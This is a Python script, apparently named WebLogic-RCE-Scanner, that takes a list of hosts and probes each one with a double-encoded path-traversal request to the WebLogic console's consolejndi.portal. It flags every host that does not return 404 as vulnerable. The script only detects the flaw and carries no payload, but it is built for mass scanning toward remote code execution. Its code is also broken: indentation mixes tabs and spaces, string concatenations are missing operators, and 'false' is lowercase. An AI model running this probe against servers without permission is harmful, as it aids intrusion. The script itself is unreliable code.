import urllib3
import argparse
import requests, sys
requests.packages.urllib3.disable_warnings()


def archivo_urls(archivo):
	lista=open(archivo, 'r')
	lista_objetivos=lista.readlines()

	for objetivo in lista_objetivos:
		objetivo = objetivo.strip()
        if not objetivo.startswith("http"):
    		objetivo = "http://" objetivo + "/console/css/%252e%252e%252f/consolejndi.portal"
        else:
           	objetivo = objetivo + "/console/css/%252e%252e%252f/consolejndi.portal"
		try:
			respuesta = requests.get(objetivo, verify=false)
			if (respuesta.status_code != 404):
				print(objetivo, "mailsms vulnerable")
			else:
				print(objetivo, "No vulnerable")
		except requests.exceptions.ConnectionError:
			print (objetivo,"Sin conexión")


def test_url(url):
	url=url.strip()
    if not url.startswith("http"):
        url = "http://" url + "/console/css/%252e%252e%252f/consolejndi.portal"
    else:
        url = url + "/console/css/%252e%252e%252f/consolejndi.portal"
	try:
		respuesta = requests.get(url)
		if (respuesta.status_code != 404):
			print (url, "mailsms vulnerable")
		else:
			print (url,"No vulnerable")
	except requests.exceptions.ConnectionError:
			print (sys.argv[2],"sin conexión")



if __name__ == '__main__':
	try:
		if str(sys.argv[1]) == "-l":
			parser = argparse.ArgumentParser(description="WebLogic-RCE-Scanner.py -t Hosts.txt")
			parser.add_argument('-l','--target',metavar="",help="Archivo con urls")
			args = parser.parse_args()
			archivo = args.target
			archivo_urls(archivo)
		elif str(sys.argv[1]) == "-u":
			test_url(sys.argv[2])
	except Exception as e:
        print("[1] python3 WebLogic-RCE-Scanner.py -l Hosts.txt\n[2] python3 WebLogic-RCE-Scanner.py -u http://192.168.0.100:7001")
